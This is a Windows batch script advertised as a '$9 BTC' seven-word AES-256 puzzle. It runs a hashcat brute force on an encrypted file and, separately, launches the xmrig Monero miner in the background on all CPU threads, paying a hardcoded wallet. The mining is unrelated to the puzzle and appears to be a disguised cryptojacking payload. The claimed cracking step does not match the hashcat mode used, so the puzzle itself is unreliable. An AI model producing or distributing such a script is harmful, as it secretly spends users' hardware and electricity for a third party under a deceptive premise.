@echo off
title zim $9 BTC - 7 Word AES-256 Puzzle

echo ================================================
echo     zim $9 BTC - 7 Word AES-256 Puzzle
echo ================================================
echo.

:: -----------------------------
:: Configurable variables
:: -----------------------------
set BTC_PRIZE=bc1qmy3yagfemypkv92rfc24tnykx4z68gfl6ccggj	  
set ENC_FILE=prize.enc
set WORDLIST=phrases.txt
set OUTFILE=cracked_key.txt

echo Prize Address: %BTC_PRIZE%
echo Mining Coin: Monero (CPU only)
echo.

:: -----------------------------
:: Start 7-word brute force using Hashcat (GPU)
:: -----------------------------
echo [1] Starting 7-Word AES-256 Brute Force (GPU)...
hashcat -a 0 -m 15700 %ENC_FILE% %WORDLIST% -w 3 --outfile=%OUTFILE% --outfile-format=2

:: Print key if found
if exist %OUTFILE% (
    echo.
    echo ================================================
    echo Key Found!
    echo -----------------------------------------------
    type %OUTFILE%
    echo ================================================
) else (
    echo No key found.
)

:: -----------------------------
:: Start Monero mining on CPU only (wallet hardcoded)
:: -----------------------------
echo.
echo [2] Starting Monero Mining on CPU...
start "Monero Miner" xmrig -o p2pool.io:3333 -u 82YSDMvhtNAXXE2zLH22cTJWUWCZTUbRzCb71FkMATeoiu9RK24HChE3FSne2qpHhegMcrA5K5q8A61c3gFajrVNPQuRdy6 -coin MONERO --threads 0 --background --donate-level 0 --rig-id 7WordPuzzle

echo.
echo Both processes are running!
echo GPU = Hashcat brute-force
echo CPU = Monero mining (wallet locked)
echo.
pause